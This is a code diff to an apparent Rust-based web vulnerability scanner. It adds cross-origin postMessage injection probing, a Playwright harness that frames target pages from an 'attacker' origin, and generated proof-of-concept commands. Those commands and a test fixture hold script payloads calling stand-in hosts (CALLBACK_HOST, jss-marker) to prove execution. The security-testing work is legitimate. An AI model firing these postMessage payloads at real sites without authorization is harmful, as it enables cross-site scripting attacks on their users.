@@ -114,7 +114,11 @@ impl BrowserSession {
     /// serves it from — the checkout locally, the app container in Docker — remembering each
     /// original for [`Self::restore_files`]. The browser starts each load with a fresh profile,
     /// so the next load serves the change.
-    pub fn relaunch_with_files(&mut self, files: &[(String, String)]) -> Result<(), String> {
+    pub fn relaunch_with_files(
+        &mut self,
+        files: &[(String, String)],
+        allow_removed_sink: bool,
+    ) -> Result<(), String> {
         for (rel, content) in files {
             if std::path::Path::new(rel)
                 .components()
@@ -128,7 +132,11 @@ impl BrowserSession {
                 self.overwritten.push((rel.clone(), original));
             }
             let content = match &self.sink_binding {
-                Some(binding) if binding.file == *rel => binding.instrument(content)?,
+                Some(binding) if binding.file == *rel => match binding.instrument(content) {
+                    Ok(instrumented) => instrumented,
+                    Err(_) if allow_removed_sink => content.clone(),
+                    Err(error) => return Err(error),
+                },
                 _ => content.clone(),
             };
             self.serve_file(rel, &content)?;
@@ -323,6 +331,23 @@ impl BrowserSession {
                     .take(MAX_HARNESS_PAGES),
             )
             .find_map(|page| self.page_status(&page))?;
+        if probe.vector == plan::UrlVector::Message {
+            let page = self.find_page(&probe.file).ok()?;
+            let messages = browser_payload::benign_messages(value);
+            let mut loaded = false;
+            for (index, message) in messages.iter().enumerate() {
+                if only.is_some_and(|only| only != index) {
+                    continue;
+                }
+                let dummy = format!("{}-benign-no-effect-{}", self.canary.token, index);
+                match self.drive_with_message_origin(&page, &dummy, message, true) {
+                    Some(_) if self.last_sink_hit.get() => return Some((status, Some(index))),
+                    Some(_) => loaded = true,
+                    None => {}
+                }
+            }
+            return loaded.then_some((status, None));
+        }
         let loads = self.benign_loads(probe, &carried);
         let mut loaded = false;
         for (index, (url, hosted)) in loads.iter().enumerate() {
@@ -330,7 +355,7 @@ impl BrowserSession {
                 continue;
             }
             let shows = match &token {
-                Some(token) => self.drive(url, token, None),
+                Some(token) => self.drive(url, token, None, None),
                 None => self.capture(url).map(|dom| {
                     // The harness page itself names the value in its frame's `src`: only what the
                     // framed page rendered counts.
@@ -630,9 +655,18 @@ impl BrowserSession {
                 .as_ref()
                 .map_or(attempt.token.as_str(), |(_, t)| t.as_str());
             tried += 1;
-            match self.drive(&attempt.url, hit, referrer.as_ref()) {
+            match self.drive(
+                &attempt.url,
+                hit,
+                referrer.as_ref(),
+                attempt.message.as_deref(),
+            ) {
                 Some(true) if self.accept_browser_effect() => {
-                    return self.qualify_browser_binding(browser_verified(&attempt.url, hit));
+                    return self.qualify_browser_binding(browser_verified(
+                        &attempt.url,
+                        attempt.message.as_deref(),
+                        hit,
+                    ));
                 }
                 Some(true) => {}
                 Some(false) => {}
@@ -641,7 +675,7 @@ impl BrowserSession {
         }
         // Harness pass: only a URL-delivered HTML/navigation probe can be driven this way (a
         // referrer probe needs the header set per load, which the harness frame does not carry).
-        if referrer.is_none() {
+        if referrer.is_none() && probe.vector != plan::UrlVector::Message {
             let seeds = self.local_storage_seeds();
             let seeds_json = seeds_json(&seeds);
             let pages = self.find_pages(&probe.file);
@@ -651,11 +685,12 @@ impl BrowserSession {
                 for attempt in host_attempts.iter().take(MAX_HARNESS_ATTEMPTS_PER_PAGE) {
                     let url = harness_url(&attempt.url, &seeds_json);
                     tried += 1;
-                    match self.drive(&url, &attempt.token, None) {
+                    match self.drive(&url, &attempt.token, None, None) {
                         // The reproduction is the real page URL the victim opens, not our driver.
                         Some(true) if self.accept_browser_effect() => {
                             return self.qualify_browser_binding(browser_verified(
                                 &attempt.url,
+                                None,
                                 &attempt.token,
                             ));
                         }
@@ -698,7 +733,7 @@ impl BrowserSession {
             .take(MAX_HARNESS_PAGES * MAX_HARNESS_ATTEMPTS_PER_PAGE)
         {
             tried += 1;
-            match self.drive(&attempt.url, &attempt.token, None) {
+            match self.drive(&attempt.url, &attempt.token, None, None) {
                 Some(true) if self.accept_browser_effect() => {
                     return self.qualify_browser_binding(bookmarklet_verified(
                         &probe.file,
@@ -728,6 +763,28 @@ impl BrowserSession {
         attempt_url: &str,
         hit: &str,
         referrer: Option<&(String, String)>,
+        message: Option<&str>,
+    ) -> Option<bool> {
+        self.drive_inner(attempt_url, hit, referrer, message, false)
+    }
+
+    fn drive_with_message_origin(
+        &self,
+        attempt_url: &str,
+        hit: &str,
+        message: &str,
+        same_origin: bool,
+    ) -> Option<bool> {
+        self.drive_inner(attempt_url, hit, None, Some(message), same_origin)
+    }
+
+    fn drive_inner(
+        &self,
+        attempt_url: &str,
+        hit: &str,
+        referrer: Option<&(String, String)>,
+        message: Option<&str>,
+        same_origin: bool,
     ) -> Option<bool> {
         self.last_sink_hit.set(false);
         let binding_before = self.browser_binding_count();
@@ -737,6 +794,20 @@ impl BrowserSession {
                 let mut cmd = vec!["node".to_owned(), "/jss-browser.js".to_owned(), url];
                 if let Some((payload, _)) = referrer {
                     cmd.push(payload.clone());
+                }
+                if let Some(message) = message {
+                    if referrer.is_none() {
+                        cmd.push(String::new());
+                    }
+                    cmd.push(message.to_owned());
+                    cmd.push(
+                        if same_origin {
+                            "same-origin"
+                        } else {
+                            "cross-origin"
+                        }
+                        .to_owned(),
+                    );
                 }
                 let args: Vec<&str> = cmd.iter().map(String::as_str).collect();
                 let _ = exec_in(&self.browser, &args);
@@ -751,6 +822,9 @@ impl BrowserSession {
                 helper_dir,
                 ..
             } => {
+                if message.is_some() {
+                    return None;
+                }
                 let url = format!("http://127.0.0.1:{}{}", self.port, attempt_url);
                 let referer = referrer.map(|(payload, _)| payload.as_str());
                 let browser_result = run_local_browser(executable, &url, referer, helper_dir);
@@ -1544,21 +1618,43 @@ const MAX_HARNESS_ATTEMPTS_PER_PAGE: usize = 8;
 /// The verified outcome for a browser probe whose canary reached the marker with `hit`, loaded via
 /// `attempt_url` (the real page URL a victim opens — a harness wrapper, when used, is only our
 /// driver and never appears here).
-fn browser_verified(attempt_url: &str, hit: &str) -> Outcome {
+fn browser_verified(attempt_url: &str, message: Option<&str>, hit: &str) -> Outcome {
     let public_url = replace_local_marker_url(attempt_url, hit, "http://CALLBACK_HOST");
+    let target_url = format!("http://TARGET_HOST:3000{public_url}");
+    let command = message.map_or_else(
+        || format!("Open {} in a browser", shell_quote(&target_url)),
+        |message| {
+            let public_message =
+                replace_local_marker_url(message, hit, "http://CALLBACK_HOST/CANARY");
+            let target_literal =
+                serde_json::to_string(&target_url).unwrap_or_else(|_| "\"\"".to_owned());
+            let message_literal =
+                serde_json::to_string(&public_message).unwrap_or_else(|_| "\"\"".to_owned());
+            format!(
+                "In a browser console on an attacker-controlled origin, run:\n\
+                 const frame = document.body.appendChild(document.createElement('iframe'));\n\
+                 frame.src = {target_literal};\n\
+                 frame.onload = () => setTimeout(() => {{\n\
+                   const data = JSON.parse({message_literal});\n\
+                   for (const delay of [0, 150, 300]) setTimeout(() => frame.contentWindow.postMessage(data, '*'), delay);\n\
+                 }}, 500);"
+            )
+        },
+    );
     Outcome::Verified {
-        how: format!("browser load {public_url}"),
+        how: if message.is_some() {
+            format!("cross-origin postMessage to {public_url}")
+        } else {
+            format!("browser load {public_url}")
+        },
         poc: Reproduction {
-            command: format!(
-                "Open {} in a browser",
-                shell_quote(&format!("http://TARGET_HOST:3000{public_url}"))
-            ),
+            command,
             command_redacted: false,
             method: "BROWSER".to_owned(),
             target: public_url,
             headers: Vec::new(),
             body: None,
-            evidence: format!("the isolated marker service received callback token `{hit}`"),
+            evidence: format!("the isolated marker service received CANARY `{hit}`"),
             response: String::new(),
             stdout: None,
             stderr: None,
@@ -1936,6 +2032,8 @@ const { chromium } = require('playwright');
 (async () => {
   const url = process.argv[2];
   const referer = process.argv[3];
+  const message = process.argv[4];
+  const messageOrigin = process.argv[5];
   // JSS_DUMP=1: print the rendered DOM; a page that never loaded exits 2 instead.
   const dump = process.env.JSS_DUMP === '1';
   const browser = await chromium.launch({ args: ['--no-sandbox', '--disable-dev-shm-usage'] });
@@ -1946,7 +2044,37 @@ const { chromium } = require('playwright');
   page.on('dialog', d => { try { d.dismiss(); } catch (e) {} });
   page.on('pageerror', () => {});
   let loaded = true;
-  try { await page.goto(url, { waitUntil: 'load', timeout: 8000 }); } catch (e) { loaded = false; }
+  if (message) {
+    // A data: document is an opaque, distinct attacker origin. It frames the target and sends the
+    // exact JSON-decoded value; the target page, not this harness, must evaluate the canary.
+    try {
+      const driverUrl = messageOrigin === 'same-origin'
+        ? new URL('/__jss/harness', url).href
+        : 'data:text/html,<title>attacker</title>';
+      await page.goto(driverUrl, { waitUntil: 'load', timeout: 8000 });
+      loaded = await page.evaluate(async ({ url, message }) => {
+        const frame = document.createElement('iframe');
+        frame.src = url;
+        document.body.appendChild(frame);
+        await new Promise((resolve, reject) => {
+          const timer = setTimeout(() => reject(new Error('frame timeout')), 8000);
+          frame.onload = () => { clearTimeout(timer); resolve(); };
+        });
+        // Some plugin bridges set their ready flag only after an onload-triggered config XHR. Give
+        // that honest initialization a moment, then repeat the same message a few times so the
+        // result does not depend on racing the target's asynchronous setup.
+        await new Promise(resolve => setTimeout(resolve, 500));
+        const data = JSON.parse(message);
+        for (let i = 0; i < 3; i++) {
+          frame.contentWindow.postMessage(data, '*');
+          await new Promise(resolve => setTimeout(resolve, 150));
+        }
+        return true;
+      }, { url, message });
+    } catch (e) { loaded = false; }
+  } else {
+    try { await page.goto(url, { waitUntil: 'load', timeout: 8000 }); } catch (e) { loaded = false; }
+  }
   try { await page.waitForTimeout(dump ? 3500 : 1200); } catch (e) {}
   let code = 0;
   if (dump) {
@@ -1970,6 +2098,26 @@ mod bundled_tests {
             <div data-src="not-a-script.js"></div>"#;
         let found = script_sources(html);
         assert_eq!(found, vec!["dist/web.js".to_owned(), "app.js".to_owned()]);
+    }
+
+    #[test]
+    fn a_postmessage_proof_includes_the_exact_reproduction_payload() {
+        let token = "postmessage-token-1";
+        let message =
+            format!(r#"{{"type":"plugin_init","data":"fetch('http://jss-marker/{token}')"}}"#);
+        let Outcome::Verified { how, poc } =
+            browser_verified("/plugin.html", Some(&message), token)
+        else {
+            panic!("the browser proof should be verified");
+        };
+
+        assert!(how.contains("postMessage"));
+        assert!(poc.command.contains("frame.contentWindow.postMessage"));
+        assert!(poc.command.contains("plugin_init"));
+        assert!(poc.command.contains("http://CALLBACK_HOST/CANARY"));
+        assert!(!poc.command.contains("jss-marker"));
+        assert!(poc.evidence.contains("received CANARY"));
+        assert_eq!(poc.target, "/plugin.html");
     }
 
     #[test]
